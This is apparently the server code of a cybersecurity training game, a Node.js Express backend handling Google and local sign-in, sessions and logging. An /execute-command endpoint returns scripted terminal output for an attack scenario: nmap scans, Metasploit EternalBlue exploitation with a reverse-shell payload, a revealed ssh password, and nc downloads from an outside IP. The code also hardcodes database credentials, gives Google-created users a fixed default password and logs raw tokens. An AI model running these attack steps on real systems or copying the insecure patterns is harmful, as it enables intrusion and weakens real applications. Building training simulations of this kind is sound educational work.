// Import required libraries and modules
const express = require('express');
const { OAuth2Client } = require('google-auth-library');
const winston = require('winston');
const mysql = require('mysql2/promise');
const cors = require('cors');
const bcrypt = require('bcrypt');
const { stringify } = require('querystring');
const saltRounds = 10; // Adjust based on security requirements

process.env.TZ = 'UTC'; // UTC Time Zone

// Create an Express app
const app = express();
const client = new OAuth2Client("398792302857-gj4s9331t22kljn6inunra5tblqlmmpe.apps.googleusercontent.com");

const pool = mysql.createPool({
    host: 'localhost',
    user: 'CaseAdmin',
    password: 'CasePassword',
    database: 'CaseDB',
    port: 3307
});

// Database Logger Function
async function logToDatabase(logLevel, logMessage, additionalInfo = {}) {
    const logData = JSON.stringify({ level: logLevel, message: logMessage, ...additionalInfo });
    const logTime = new Date().toISOString().slice(0, 19).replace('T', ' '); // Format current time for MySQL

    try {
        // Insert log entry without specifying log_id, as it's auto-incremented
        await pool.query('INSERT INTO Logs (log_time, log_data) VALUES (?, ?)', [logTime, logData]);
    } catch (error) {
        console.error('Error logging to database:', error);
    }
}


initializeDatabaseConnection = async () => {
    try {
        // Connect to the Database CaseDB
        await pool.query(`USE CaseDB;`);
        // Clear leftover Sessions from last spin-up to prevent conflicts
        await pool.query(`TRUNCATE Sessions;`);
        logToDatabase('info', 'Database connection successfull.')
    } catch (error) {
        logToDatabase('error', `Error connecting to the database: ${error}`)
        throw error;
    }
};



// Initialize the database and create the required table
initializeDatabaseConnection()
    .then(() => {
        // Start the server only after the database is initialized
        app.use(express.json());
        app.use(cors({ origin: 'http://localhost:5500', credentials: true }));

        // VerifyToken endpoint
        app.post('/verifyToken', async (req, res) => {
            const token = req.body.token;
            logToDatabase('info', `Received token for verification: ${token}`);
            try {
                const ticket = await client.verifyIdToken({
                    idToken: token,
                    audience: "398792302857-gj4s9331t22kljn6inunra5tblqlmmpe.apps.googleusercontent.com",
                });
                const payload = ticket.getPayload();

                logToDatabase('info', `Token verified successfully. UserId: ${payload['sub']}`);

                const userId = payload['email'];

                // Check if the user exists in the Users table
                const [userExists] = await pool.query('SELECT * FROM Users WHERE userId = ?', [userId]);

                if (userExists.length === 0) {
                    // User does not exist, create a new user
                    bcrypt.hash("P@ssw0rd", saltRounds, async (err, hashedPassword) => {
                        if (err) {
                            logToDatabase('error', `Error hashing password: ${err}`)
                            return res.status(500).json({ success: false, message: 'Error registering new user' });
                        }
                        try {
                            // Insert the new user with a parameterized query
                            await pool.query('INSERT INTO Users (userId, pass) VALUES (?, ?)', [userId, hashedPassword]);
                            logToDatabase('info', `New user registered successfully: ${userId}`);

                            // Create a new session after registering the user
                            const [result] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [userId, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
                            const sessionId = result.insertId;
                            logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);

                            // Include sessionId in the response JSON
                            res.json({ verified: true, sessionId: sessionId });
                        } catch (error) {
                            logToDatabase('error', `Error registering new user: ${error}`)
                            return res.status(500).json({ success: false, message: 'Error registering new user' });
                        }
                    });
                } else {
                    // User exists, proceed to check or create session
                    const [existingSessions] = await pool.query('SELECT * FROM Sessions WHERE userId = ? AND expiresAt > NOW()', [userId]);

                    if (existingSessions.length > 0) {
                        // Update existing session instead of creating a new one
                        const sessionId = existingSessions[0].sessionId;
                        logToDatabase('info', `Session already exists for userId: ${userId}. Updating session: ${sessionId}`);
                        await pool.query('UPDATE Sessions SET expiresAt = ? WHERE sessionId = ?', [new Date(Date.now() + 4 * 3600 * 1000), sessionId]); // Update expiration time

                        // Include sessionId in the response JSON
                        res.json({ verified: true, sessionId: sessionId });
                    } else {
                        // Create a new session
                        const [result] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [userId, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
                        const sessionId = result.insertId;
                        logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);

                        // Include sessionId in the response JSON
                        res.json({ verified: true, sessionId: sessionId });
                    }
                }
            } catch (error) {
                logToDatabase('error', `Token verification failed: ${error}`);
                res.status(401).json({ verified: false, error: error.message });
            }
        });




        // VerifySession middleware
        const verifySession = async (req, res, next) => {
            const sessionId = req.headers['x-session-id'];
            if (!sessionId) {
                return res.status(401).json({ message: 'Session ID required' });
            }

            try {
                // Retrieve user ID associated with session ID from the database
                const userId = await getUserIdFromSessionId(sessionId);
                if (!userId) {
                    return res.status(401).json({ message: 'Invalid or expired session' });
                }

                next();
            } catch (error) {
                console.error('Error verifying session:', error);
                return res.status(500).json({ message: 'Internal server error' });
            }
        };

        app.get('/verifySession', verifySession, (req, res) => {
            res.json({ authenticated: true });
        });

        // Function to check password complexity
        function isPasswordComplex(password) {
            // Complexity requirements logic
            // Example: Password must be at least 8 characters long and contain at least one letter and one digit.
            const minLength = 8;
            const hasLetter = /[a-zA-Z]/.test(password);
            const hasDigit = /\d/.test(password);

            return password.length >= minLength && hasLetter && hasDigit;
        }

        // Non-Google Register Endpoint
        app.post('/register', async (req, res) => {
            const { username, password } = req.body;

            // Check password complexity using the same logic as client-side
            if (!isPasswordComplex(password)) {
                return res.status(400).json({ success: false, message: 'Password does not meet complexity requirements.' });
            }

            try {
                // Check if username exists
                const [users] = await pool.query('SELECT * FROM Users WHERE userId = ?', [username]);
                if (users.length > 0) {
                    return res.status(409).json({ success: false, message: 'Username already exists' });
                }

                // Hash the password
                bcrypt.hash(password, saltRounds, async (err, hashedPassword) => {
                    if (err) {
                        logToDatabase('error', `Error hashing password: ${err}`)
                        return res.status(500).json({ success: false, message: 'Error registering new user' });
                    }

                    try {
                        // Insert the new user with a parameterized query
                        await pool.query('INSERT INTO Users (userId, pass) VALUES (?, ?)', [username, hashedPassword]);
                        res.status(201).json({ success: true, message: 'User registered successfully' });
                    } catch (error) {
                        logToDatabase('error', `Error registering new user: ${error}`)
                        res.status(500).json({ success: false, message: 'Error registering new user' });
                    }
                });
            } catch (error) {
                logToDatabase('error', `Error checking username: ${error}`)
                res.status(500).json({ success: false, message: 'Error registering new user' });
            }
        });

        // Non-Google Sign In Endpoint
        app.post('/signin', async (req, res) => {
            const { username, password } = req.body;
            console.log(`Attempting to sign in user: ${username}`);

            const [users] = await pool.query('SELECT * FROM Users WHERE userId = ?', [username]);
            if (users.length === 0) {
                return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
            }

            const user = users[0];
            const decodedPassword = decodeURIComponent(password);
            bcrypt.compare(decodedPassword, user.pass, async (err, result) => {
                if (err) {
                    logToDatabase('error', `Error during password comparison: ${err}`)
                    return res.status(500).json({ authenticated: false, message: 'Error during sign in' });
                }

                if (!result) {
                    logToDatabase('warn', `Authentication failed for user ${username}`)
                    return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
                }
                const [sessionResult] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [username, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
                const sessionId = sessionResult.insertId;
                logToDatabase('info', `User signed in successfully: ${username}`)
                logToDatabase('info', `Session created for user: ${username}, userId: ${user.id}, sessionId: ${sessionId}`)
                res.json({ authenticated: true, sessionId: sessionId });
            });
        });

        // Sign-out Endpoint
        app.post('/signout', async (req, res) => {
            const sessionId = req.headers['x-session-id'];
            if (!sessionId) {
                return res.status(401).json({ message: 'Session ID required for sign out' });
            }

            try {
                // Check if the session exists in the sessions table
                const [sessions] = await pool.query('SELECT * FROM Sessions WHERE sessionId = ?', [sessionId]);

                if (sessions.length === 0) {
                    // Session not found, return an error response
                    return res.status(401).json({ message: 'Invalid session ID' });
                }

                // Delete the session to sign the user out
                await pool.query('DELETE FROM Sessions WHERE sessionId = ?', [sessionId]);

                // Check if the session was associated with a Google account
                if (sessions[0].userId.startsWith('google:')) {
                    // Handle sign-out for Google users (you may need to implement Google sign-out logic here)
                    // For Google sign-out, you can revoke the access token or perform any necessary actions.
                    // Example:
                    // await revokeGoogleAccessToken(sessions[0].userId.substring(7)); // Remove 'google:' prefix
                    // Return a success response
                    return res.status(200).json({ message: 'Sign-out successful' });
                } else {
                    // Handle sign-out for local users (clear their session)
                    // Local users can be signed out by deleting the session from the sessions table.
                    // Return a success response
                    return res.status(200).json({ message: 'Sign-out successful' });
                }
            } catch (error) {
                // Handle errors
                console.error('Error during sign-out:', error);
                return res.status(500).json({ message: 'Error during sign-out' });
            }
        });

        // Execute Command endpoint
        app.post('/execute-command', async (req, res) => {
            const { command } = req.body; // Extract the command from the request body

            const commandResponses = {
                'date': () => `Current Date and Time: ${new Date().toString()}\r\n`,
                'nmap -p 139,445 192.168.1.0/24': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.103\nHost is up (0.011s latency).\nPORT    STATE    SERVICE\n139/tcp open     netbios-ssn\n445/tcp open     microsoft-ds\r\n`,
                'msfconsole': () => `Launching msfconsole....\r\n`,
                'use auxiliary/scanner/smb/smb_ms17_010': () => `msf auxiliary(scanner/smb/smb_ms17_010)>\r\n`,
                'set RHOST 192.168.1.103': () => `RHOSTS => 192.168.1.103\r\n`,
                'run': () => `[+] 192.168.1.103:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 x64 (64-bit)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution complete\r\n`,
                'use exploit/windows/smb/ms17_010_eternalblue': () => `msf exploit(windows/smb/ms17_010_eternalblue)>\r\n`,
                'set payload generic/shell_reverse_tcp': () => `payload => generic/shell_reverse_tcp\r\n`,
                'exploit': () => `Exploiting 192.168.1.103....\n....\nExploited....\nFLAG: u46U0o\r\n`,
                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
                
                'ssh 192.168.1.47': () => `Username: faziodavid\r\nPassword: 1aB3cD7e\r\nLast login: Thu Jan 25 16:43:27 2024 from 192.168.1.47\nfaziodavid@Ubuntu:$`,
                'su - bmcadmin': () => `Switched to BMC default user successfully.`,
                'nc 74.233.19.204 12345 > nmap.tar.gz': () => `Downloaded nmap tool successfully.`,
                'nc 74.233.19.204 12345 > metasploit.tar.gz': () => `Downloaded Metasploit tool successfully.`,
                'tar -xzf nmap.tar.gz': () => `Unzipped nmap tool successfully.`,
                'tar -xzf metasploit.tar.gz': () => `Unzipped Metasploit tool successfully.`,
                'nmap 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nHost is up (0.012s latency).\nPORT STATE SERVICE\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n623/tcp open ipmi\n`,
                'nmap -sV -p 135 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nPORT STATE SERVICE VERSION\n135/tcp open msrpc Microsoft Windows RPC\n(unauthenticated) 5.1 (Windows 10)\n\nFLAG: HivRzt`,
                'help-module2': () => `Available Module 2 Commands:\n- ssh 192.168.1.47\n- su - bmcadmin\n- nc 74.233.19.204 12345 > nmap.tar.gz\n- nc 74.233.19.204 12345 > metasploit.tar.gz\n- tar -xzf nmap.tar.gz\n- tar -xzf metasploit.tar.gz\n- nmap 192.168.1.47\n- nmap -sV -p 135 192.168.1.47\nFor more information on each command, please refer to the respective tool's documentation.\r\n`
            };
            

            if (command in commandResponses) {
                const response = commandResponses[command];
                // If the command response is a function, execute it to get the response
                const result = typeof response === 'function' ? response() : response;
                res.send(result);
            } else {
                res.send(`Command not recognized: ${command}\r\n`);
            }
        });


        app.listen(3000, () => {
            console.log('Server running on port 3000');
        });

        // Client-Logs Endpoint
        app.post('/client-logs', express.json(), async (req, res) => {
            const { message, level } = req.body;

            await logToDatabase(level, message);

            res.status(204).end();  // No content to send back
        })

        /**
         * Retrieve the user ID associated with a given session ID from the database.
         * This function queries the database to find the user ID linked to the provided session ID.
         * @param {string} sessionId - The unique session identifier.
         * @returns {string|null} The user ID if found, or null if not found.
         */
        async function getUserIdFromSessionId(sessionId) {
            try {
                // Query the database to retrieve the user ID associated with the session ID
                const [sessions] = await pool.query('SELECT userId FROM Sessions WHERE sessionId = ? AND expiresAt > NOW()', [sessionId]);

                // Check if a session with the provided session ID exists
                if (sessions.length > 0) {
                    // Return the user ID associated with the session
                    return sessions[0].userId;
                } else {
                    // Session not found or expired, return null
                    return null;
                }
            } catch (error) {
                // Log any errors that occur during the database query
                console.error('Error retrieving user ID from session ID:', error);
                throw error; // Rethrow the error to handle it at a higher level
            }
        }

    })
    .catch((error) => {
        // Handle initialization errors here
        console.error('Failed to initialize the database:', error);
    });